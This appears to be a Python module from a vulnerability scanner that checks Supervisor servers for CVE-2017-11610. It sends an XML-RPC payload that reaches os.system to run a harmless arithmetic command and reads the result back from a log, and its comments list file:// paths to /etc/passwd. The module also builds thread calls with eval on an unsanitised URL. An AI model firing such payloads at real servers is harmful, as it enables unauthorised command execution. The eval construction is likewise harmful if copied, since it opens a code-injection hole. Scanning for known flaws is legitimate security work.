#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Supervisor是用Python开发的一套通用的进程管理程序, 能将一个普通的命令行进程变为后台daemon, 并监控进程状态, 异常退出时能自动重启;
是Linux/Unix系统下的一个进程管理工具, 不支持Windows系统;
    Supervisor扫描类: 
        1. Supervisord 远程命令执行
            CVE-2017-11610
                Payload: https://vulhub.org/#/environments/supervisor/CVE-2017-11610/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.thread import thread
from payloads.Supervisor.cve_2017_11610 import cve_2017_11610_scan

class Supervisor():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Supervisor'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.random_num_1, self.random_num_2 = random_int_2(5)

        self.cve_2017_11610_payloads = [
            {
                'path': 'RPC2',
                'data': '''<?xml version='1.0'?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<value><string>expr {} + {} | tee -a /tmp/supervisord.log</string></value>
</param>
</params>
</methodCall>'''.format(self.random_num_1, self.random_num_2)
            },
            {
                'path': 'RPC2',
                'data': '''<?xml version='1.0'?>
<methodCall>
<methodName>supervisor.readLog</methodName>
<params>
<param>
<value><int>0</int></value>
</param>
<param>
<value><int>0</int></value>
</param>
</params>
</methodCall>'''
            },
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_11610_scan, url=url)
        ]

Supervisor.cve_2017_11610_scan = cve_2017_11610_scan

supervisor = Supervisor()
